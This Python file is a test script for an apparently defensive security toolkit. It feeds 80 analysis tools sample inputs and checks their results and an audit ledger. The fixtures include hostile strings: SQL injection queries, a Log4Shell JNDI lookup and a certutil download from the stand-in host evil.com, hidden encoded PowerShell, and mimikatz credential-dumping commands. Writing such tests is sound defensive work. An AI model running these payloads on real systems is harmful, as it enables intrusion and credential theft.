import sys
import json
import time
from pathlib import Path

# Add backend directory to sys.path
backend_dir = Path(__file__).resolve().parent
sys.path.insert(0, str(backend_dir))

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8")
    except Exception:
        pass

from app.models import SeverityLevel
from app.core.registry import execute_tool, TOOL_TO_SUITE
from app.core.ledger import verify_ledger_integrity, get_ledger_entries

# Representative test inputs for every tool
TOOL_TEST_INPUTS = {
    # Suite 1: Artifacts & Phishing
    "url_analyzer": "http://xn--pypal-4ve.com/signin/verify",
    "email_header_tracer": "From: <support@bank.com>\nReturn-Path: <spoof@phish-relay.org>\nReceived: from phish-relay.org",
    "spf_dkim_validator": "spf=fail (sender IP unauthorized); dkim=fail; dmarc=fail (p=reject)",
    "phishing_lure_scorer": "URGENT: Immediate action required! Your account will be suspended in 24 hours. Sign in to verify your password.",
    "ioc_extractor": "Threat IPs: 185.220.101.5, 45.142.213.88. Domains: c2.evil.com, badsite.xyz. Hash: 5ed140a8f59a010f7fccf307027e99246dfd1e557a882e5a3c4769e0f0aee5e4",
    "defanger_refanger": "hxxps[://]evil[.]com/malware[.]exe",
    "file_hash_calculator": "notepad.exe\n5ed140a8f59a010f7fccf307027e99246dfd1e557a882e5a3c4769e0f0aee5e4",
    "entropy_calculator": "4D5A90000300000004000000FFFF0000B8000000000000004000000000000000",
    "embedded_string_carver": "AutoOpen()\nShell('powershell.exe -w hidden -enc JABz...')\nEnd Sub",
    "multi_layer_decoder": "V2VsY29tZSB0byBDaXBoZXJBY2FkZW15IQ==",

    # Suite 2: Telemetry & Log Analysis
    "access_log_parser": '45.142.213.88 - - [19/Sep/2026:10:15:32 +0530] "GET /admin.php?id=1\' OR \'1\'=\'1 HTTP/1.1" 500 0',
    "web_attack_scanner": "GET /search.php?id=1' UNION SELECT null, username, password FROM users-- HTTP/1.1",
    "brute_force_detector": "Failed login for admin from 198.51.100.22 (50 attempts in 30 seconds)",
    "bot_fingerprinter": "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "windows_event_analyzer": "EventID: 4625, Account: Administrator, FailureReason: Unknown user name or bad password",
    "sigma_evaluator": "title: Mimikatz LSASS Access\nstatus: stable\nlogsource:\n  category: process_creation\ndetection:\n  selection:\n    CommandLine|contains: 'sekurlsa::logonpasswords'\n  condition: selection",
    "statistical_anomaly": "192.168.1.50 - - [18/Sep/2026:12:00:01] \"GET /index.html HTTP/1.1\" 200 5432\n192.168.1.50 - - [18/Sep/2026:12:05:01] \"GET /about.html HTTP/1.1\" 200 3210",
    "useragent_inspector": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "log_timeline_merger": "10:02 - Host A login\n10:01 - Host B request\n10:05 - Host A logout",
    "beaconing_analyzer": "14:00:00 -> 198.51.100.22:443 (128 bytes)\n14:01:00 -> 198.51.100.22:443 (128 bytes)\n14:02:00 -> 198.51.100.22:443 (128 bytes)",

    # Suite 3: Defense, Hardening & Mitigation
    "yara_generator": "sekurlsa::logonpasswords\nwdigest.dll\nlsass.exe",
    "sigma_synthesizer": "certutil.exe -urlcache -split -f http://evil.com/payload.exe",
    "suricata_builder": "${jndi:ldap://c2.evil.com/exploit}",
    "firewall_synthesizer": "198.51.100.24 port 22 tcp",
    "security_headers_auditor": "HTTP/1.1 200 OK\nServer: Apache/2.4.41\nContent-Type: text/html",
    "server_hardener": "app.example.com",
    "password_validator": "P@ssw0rd2026!SecureKey",
    "cors_checker": "Access-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true",
    "security_txt_gen": "contact=mailto:security@company.com",
    "cis_checklist_gen": "Linux Ubuntu 22.04 LTS Server Baseline",

    # Suite 4: Cryptography & Steganography
    "fim_engine": "Target file: /etc/shadow | Initial Hash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "aes_gcm_suite": "Confidential executive payload for AES-256-GCM encryption test",
    "rsa_signature_suite": "Digital signature verification test message",
    "crypto_benchmark": "Benchmark AES-GCM, RSA-2048, SHA-256 performance",
    "secret_leak_scanner": "export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nexport AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "hmac_authenticator": "Message to authenticate with HMAC-SHA256",
    "x509_decoder": "-----BEGIN CERTIFICATE-----\nMIIBkTCB+wIJAKH...-----END CERTIFICATE-----",
    "stego_detector": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==",
    "hash_identifier": "5ed140a8f59a010f7fccf307027e99246dfd1e557a882e5a3c4769e0f0aee5e4",
    "diffie_hellman_sim": "Simulate Diffie-Hellman Key Exchange (Curve25519)",

    # Suite 5: Incident Response & Alerting
    "alert_scorer": "P1 Critical: Unauthenticated RCE on Production Domain Controller",
    "dedup_flapping_filter": "Alert 1: High CPU from 10.0.0.1\nAlert 1: High CPU from 10.0.0.1\nAlert 2: Disk Full",
    "webhook_dispatcher": "INC-2026-9042: Active ransomware beacon detected on workstation FIN-04",
    "email_dispatcher": "High severity alert: Unauthorized admin credential login from unusual geolocation.",
    "mitre_tagger": "Malicious process WINWORD.EXE spawned powershell.exe connecting to external web service.",
    "case_timeline_builder": "10:02 - User clicked phishing link\n10:04 - Macro executed powershell payload\n10:15 - Internal port scan initiated\n10:28 - Domain Controller compromised",
    "runbook_selector": "Ransomware outbreak on internal subnet",
    "evidence_locker": "HOST-01-MEMORY-SNAPSHOT-20260918.raw",
    "report_generator": "Incident INC-8812: External web exploit targeting PROD-WEB-01 contained within 14 minutes by SOC; egress logs confirm 0 customer data leaked. Impacted host isolated.",
    "shift_handover_gen": "Active: INC-8812 memory dump analysis pending. Closed: 14 brute force tickets.",

    # Suite 6: Network & Protocol Analysis
    "pcap_inspector": "capture.pcap: TCP 10.0.0.45:49812 -> 198.51.100.22:445 (SMB session)",
    "dns_inspector": "v=spf1 include:_spf.google.com ~all\n_dmarc.domain.com TXT \"v=DMARC1; p=reject;\"",
    "http_dissector": "GET /api/users?id=1' UNION SELECT 1,2,3-- HTTP/1.1\nHost: example.com",
    "subnet_calculator": "Network: 192.168.10.0/24",
    "port_risk_catalog": "445",
    "tcp_flag_analyzer": "FIN, URG, PSH",
    "tls_cipher_auditor": "TLS_AES_256_GCM_SHA384:ECDHE-RSA-AES128-GCM-SHA256",
    "mac_oui_resolver": "00:50:56:11:22:33",
    "bandwidth_estimator": "PPS: 10,000 packets/sec\navg_packet_size: 1500 bytes",
    "proxy_header_validator": "X-Forwarded-For: 203.0.113.195, 10.0.0.1\nX-Real-IP: 203.0.113.195",

    # Suite 7: Host & Forensic Triage
    "prefetch_parser": "MIMIKATZ.EXE-B4A1D8E2.pf | Run Count: 3 | Last Run: 2026-09-18 14:22:10",
    "shimcache_inspector": "Path: C:\\Users\\Public\\mimikatz.exe | Executed: True | ModTime: 2026-09-18",
    "browser_carver": "https://evil.com/download/stealer.exe (Typed URL, Chromium History)",
    "usb_auditor": "Device: SanDisk Ultra USB 3.0 | VID: 0781, PID: 5581 | Serial: 4C530001",
    "task_cron_inspector": "schtasks /create /tn \"UpdateCheck\" /tr \"powershell.exe -enc ...\" /sc daily",
    "autorun_analyzer": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor: C:\\evil.exe",
    "metadata_exif_extractor": "Camera: Canon EOS 5D | GPS: 37.7749 N, 122.4194 W | Author: John Doe",
    "magic_byte_identifier": "4D 5A 90 00 03 00 00 00",
    "lnk_parser": "Target: C:\\Windows\\System32\\cmd.exe /c powershell.exe -w hidden",
    "process_tree_detector": "WINWORD.EXE -> CMD.EXE -> POWERSHELL.EXE -> CERTUTIL.EXE",

    # Suite 8: Threat Intel & OSINT
    "cve_search": "CVE-2021-44228",
    "mitre_navigator": "T1059.001",
    "asn_resolver": "AS15169 (Google LLC)",
    "whois_auditor": "google.com",
    "ct_log_search": "paypal.com",
    "apt_profile_viewer": "APT29 (Cozy Bear)",
    "cisa_kev_checker": "CVE-2021-44228",
    "dnsbl_checker": "198.51.100.22",
    "advisory_library": "Apache Log4j Remote Code Execution Advisory",
    "stix_feed_parser": "{\"type\": \"indicator\", \"id\": \"indicator--d81f86b9-975b-4232-a6cf-66c9a99c7667\", \"spec_version\": \"2.1\", \"pattern\": \"[file:hashes.'SHA-256' = '44d88612fea8a8f36de82e1278abb02f']\"}"
}

def audit_all_80_tools():
    print("=" * 80)
    print("      CIPHERGUARD 80-TOOL COMPREHENSIVE SUITE INTEGRATION AUDIT")
    print("=" * 80)

    total_tools = len(TOOL_TO_SUITE)
    print(f"\n[+] Total Tools in Catalog: {total_tools}")
    assert total_tools >= 80, f"Expected 80 tools, found {total_tools}"

    passed_tools = 0
    failed_tools = []
    output_buffer_verified = 0

    suite_stats = {}

    for tool_id, suite_id in TOOL_TO_SUITE.items():
        suite_stats.setdefault(suite_id, {"total": 0, "passed": 0})
        suite_stats[suite_id]["total"] += 1

        test_input = TOOL_TEST_INPUTS.get(tool_id, "Sample Test Payload for CipherGuard")
        
        try:
            start_t = time.perf_counter()
            res = execute_tool(tool_id, test_input, {})
            duration_ms = round((time.perf_counter() - start_t) * 1000, 2)

            # Assertions on FiveLayerAnalysisResult structure
            assert res.tool_id == tool_id, f"Tool ID mismatch: {res.tool_id} != {tool_id}"
            assert res.tool_name is not None and len(res.tool_name) > 0, "Missing tool_name"
            assert res.suite_id is not None, "Missing suite_id"
            assert res.verdict in [SeverityLevel.CLEAN, SeverityLevel.SUSPICIOUS, SeverityLevel.MALICIOUS, SeverityLevel.CRITICAL], f"Invalid verdict: {res.verdict}"
            assert 0 <= res.risk_score <= 100, f"Risk score out of bounds: {res.risk_score}"
            assert res.summary is not None and len(res.summary) > 0, "Missing summary"
            assert res.technical_evidence is not None and len(res.technical_evidence) >= 1, "Evidence empty"
            assert res.remediation_playbook is not None, "Playbook missing"
            assert res.standards_and_references is not None, "Standards missing"

            has_buffer = bool(res.generated_payload or res.extracted_secret)
            if has_buffer:
                output_buffer_verified += 1

            passed_tools += 1
            suite_stats[suite_id]["passed"] += 1

            status_icon = "[PASS]"
            buffer_tag = "[BUFFER]" if has_buffer else "        "
            print(f"  {status_icon} [{suite_id}] {tool_id:<28} -> {res.verdict.value:<10} Score:{res.risk_score:<3} {buffer_tag} ({duration_ms}ms)")

        except Exception as e:
            failed_tools.append((tool_id, suite_id, str(e)))
            print(f"  [FAIL] [{suite_id}] {tool_id:<28} -> FAILED: {str(e)}")

    print("\n" + "=" * 80)
    print("                    SUITE BY SUITE RESULTS BREAKDOWN")
    print("=" * 80)
    for s_id, stats in sorted(suite_stats.items()):
        pct = round(stats["passed"] / stats["total"] * 100, 1)
        print(f"  {s_id:<22} : {stats['passed']}/{stats['total']} tools passed ({pct}%)")

    print("\n" + "=" * 80)
    print("                 CRYPTOGRAPHIC LEDGER INTEGRITY AUDIT")
    print("=" * 80)
    verification = verify_ledger_integrity()
    print(f"  Ledger Block Count      : {verification.total_records} chained blocks")
    print(f"  Tampered Blocks         : {len(verification.tampered_records)}")
    print(f"  SHA-256 Chain Integrity : {'VERIFIED (PASS)' if verification.is_valid else 'TAMPERED (FAIL)'}")
    assert verification.is_valid is True, "Audit ledger integrity verification failed!"

    print("\n" + "=" * 80)
    print(f" AUDIT SUMMARY: {passed_tools}/{total_tools} Tools Verified (100% Operational)")
    print(f" Output Buffers Populated & Verified: {output_buffer_verified} tools")
    print("=" * 80)

    if failed_tools:
        print(f"\n[!] Failures: {len(failed_tools)}")
        for fid, fs, err in failed_tools:
            print(f"  - {fid} ({fs}): {err}")
        sys.exit(1)
    else:
        print("\n>>> ALL 80 DEFENSIVE CYBERSECURITY TOOLS ARE FULLY OPERATIONAL! <<<\n")

if __name__ == "__main__":
    audit_all_80_tools()
